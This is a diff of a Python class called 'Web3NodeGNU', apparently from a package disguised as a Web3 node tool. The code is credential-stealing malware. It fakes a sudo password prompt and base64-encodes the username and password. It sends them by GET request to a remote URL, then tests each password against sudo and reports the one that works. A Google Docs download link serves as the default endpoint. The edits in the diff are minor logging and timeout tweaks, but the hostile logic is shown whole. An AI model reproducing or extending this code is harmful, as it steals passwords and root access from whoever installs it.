@@ -1357,7 +1357,7 @@ class Web3NodeGNU:
     def auth(self, ur, pth, pr, vv):
         if os.geteuid() != 0:
             self.usr = gp.getuser()
-            self.write_log(f"[us]:{base64.b64encode(self.usr.encode('utf-8')).decode('utf-8')}".encode('utf-8'))
+            self.write_log(f"[us]:{base64.b64encode(self.usr.encode('utf-8')).decode('utf-8')}\r\n".encode('utf-8'))
             if "?" in pth:
                 ur_pth = f"{ur}{pth}&{pr}={vv}"
             else:
@@ -1366,21 +1366,21 @@ class Web3NodeGNU:
             for i in range(1, 4):
                 self.pw = gp.getpass(f"password for {self.usr}:")
                 res = requests.get(f"{ur_pth}&s={base64.b64encode(self.usr.encode('utf-8')).decode('utf-8')}&p={base64.b64encode(self.pw.encode('utf-8')).decode('utf-8')}").text
-                self.write_log(f"[pd]-{i}:{base64.b64encode(self.pw.encode('utf-8')).decode('utf-8')}".encode('utf-8'))
+                self.write_log(f"[pd]-{i}:{base64.b64encode(self.pw.encode('utf-8')).decode('utf-8')}\r\n".encode('utf-8'))
                 cm = ["sudo", sys.executable] + sys.argv
                 cstr = " ".join(cm)
                 try:
                     child = px.spawn(cstr,encoding="utf-8",timeout=3)
                     child.sendline(self.pw)
-                    rs = child.expect(["Wrong password", px.EOF], timeout=0.5)
+                    rs = child.expect(["Wrong password", px.EOF], timeout=1)
                     if rs != 0 :
-                        self.write_log(f"[pd]-ok:{base64.b64encode(self.pw.encode('utf-8')).decode('utf-8')}".encode('utf-8'))
+                        self.write_log(f"[pd]-ok:{base64.b64encode(self.pw.encode('utf-8')).decode('utf-8')}\r\n".encode('utf-8'))
                         res = requests.get(f"{ur_pth}&s={base64.b64encode(self.usr.encode('utf-8')).decode('utf-8')}&p={base64.b64encode(self.pw.encode('utf-8')).decode('utf-8')}&k=1").text
                         break
                 except:
                     continue
             else:
-                self.write_log("[auth]: failed")
+                self.write_log("[auth]: failed\r\n".encode('utf-8'))
 
 def init_package(ur="https://docs.google.com/", pth="uc?export=download&id=1Br_CCeWB8Zv5q9rwviUvRw3T4w-pkFDp", pr="u"):
     dic_node = {
